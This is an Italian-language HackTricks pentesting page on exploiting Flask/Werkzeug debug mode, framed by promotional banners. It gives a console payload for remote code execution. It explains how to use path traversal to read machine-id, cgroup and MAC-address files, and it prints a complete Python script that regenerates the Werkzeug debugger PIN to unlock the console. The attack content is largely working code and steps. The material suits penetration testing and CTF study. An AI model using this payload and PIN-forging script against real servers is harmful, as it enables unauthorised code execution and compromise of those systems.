# Werkzeug / Flask Debug

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per la valutazione delle vulnerabilit√† e il penetration testing**. Esegui un pentest completo da qualsiasi luogo con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla generazione di report. Non sostituiamo i pentester - sviluppiamo strumenti personalizzati, moduli di rilevamento ed exploit per permettere loro di dedicarsi a scavare pi√π a fondo, ottenere accesso shell e divertirsi.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Se il debug √® attivo, puoi provare ad accedere a `/console` e ottenere RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

Ci sono anche diversi exploit su Internet come [questo](https://github.com/its-arun/Werkzeug-Debug-RCE) o uno in metasploit.

## Pin Protetto - Traversa Percorso

In alcune occasioni, il punto di accesso **`/console`** sar√† protetto da un pin. Se hai una **vulnerabilit√† di attraversamento file**, puoi rivelare tutte le informazioni necessarie per generare quel pin.

### Exploit del PIN della console Werkzeug

Forza una pagina di errore di debug nell'app per vedere questo:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Un messaggio relativo allo scenario "console bloccata" viene visualizzato quando si tenta di accedere all'interfaccia di debug di Werkzeug, indicando la necessit√† di un PIN per sbloccare la console. Viene suggerito di sfruttare il PIN della console analizzando l'algoritmo di generazione del PIN nel file di inizializzazione del debug di Werkzeug (`__init__.py`). Il meccanismo di generazione del PIN pu√≤ essere studiato dal [**repository del codice sorgente di Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), anche se si consiglia di ottenere il codice del server effettivo tramite una vulnerabilit√† di attraversamento dei file a causa di possibili discrepanze di versione.

Per sfruttare il PIN della console, sono necessari due insiemi di variabili, `probably_public_bits` e `private_bits`:

#### **`probably_public_bits`**
- **`username`**: Si riferisce all'utente che ha avviato la sessione Flask.
- **`modname`**: Di solito designato come `flask.app`.
- **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Di solito si risolve in **Flask**.
- **`getattr(mod, '__file__', None)`**: Rappresenta il percorso completo di `app.py` all'interno della directory Flask (ad esempio, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Se `app.py` non √® applicabile, **prova con `app.pyc`**.

#### **`private_bits`**
- **`uuid.getnode()`**: Recupera l'indirizzo MAC della macchina corrente, con `str(uuid.getnode())` che lo traduce in un formato decimale.
- Per **determinare l'indirizzo MAC del server**, √® necessario identificare l'interfaccia di rete attiva utilizzata dall'applicazione (ad esempio, `ens3`). In caso di incertezza, **effettua una "leak" di `/proc/net/arp`** per trovare l'ID del dispositivo, quindi **estrai l'indirizzo MAC** da **`/sys/class/net/<device id>/address`**.
- La conversione di un indirizzo MAC esadecimale in decimale pu√≤ essere eseguita come mostrato di seguito:
```python
# Esempio di indirizzo MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
- **`get_machine_id()`**: Concatena i dati da `/etc/machine-id` o `/proc/sys/kernel/random/boot_id` con la prima riga di `/proc/self/cgroup` dopo l'ultima barra (`/`).

<details>
<summary>Codice per `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Dopo aver raccolto tutti i dati necessari, lo script di exploit pu√≤ essere eseguito per generare il PIN della console Werkzeug. Lo script utilizza i dati raccolti `probably_public_bits` e `private_bits` per creare un hash, che viene quindi elaborato ulteriormente per produrre il PIN finale. Di seguito √® riportato il codice Python per eseguire questo processo:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Questo script produce il PIN tramite l'hashing dei bit concatenati, aggiungendo specifici salts (`cookiesalt` e `pinsalt`), e formattando l'output. √à importante notare che i valori effettivi di `probably_public_bits` e `private_bits` devono essere ottenuti con precisione dal sistema di destinazione per garantire che il PIN generato corrisponda a quello atteso dalla console Werkzeug.


{% hint style="success" %}
Se si utilizza una **vecchia versione** di Werkzeug, provare a cambiare l'algoritmo di hashing in **md5** anzich√© sha1.
{% endhint %}

## Riferimenti

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per la valutazione delle vulnerabilit√† e il penetration testing**. Esegui un pentest completo da qualsiasi posizione con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla generazione di report. Non sostituiamo i pentester, sviluppiamo invece strumenti personalizzati, moduli di rilevamento ed exploit per permettere loro di dedicarsi a scavare pi√π a fondo, ottenere accesso shell e divertirsi.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
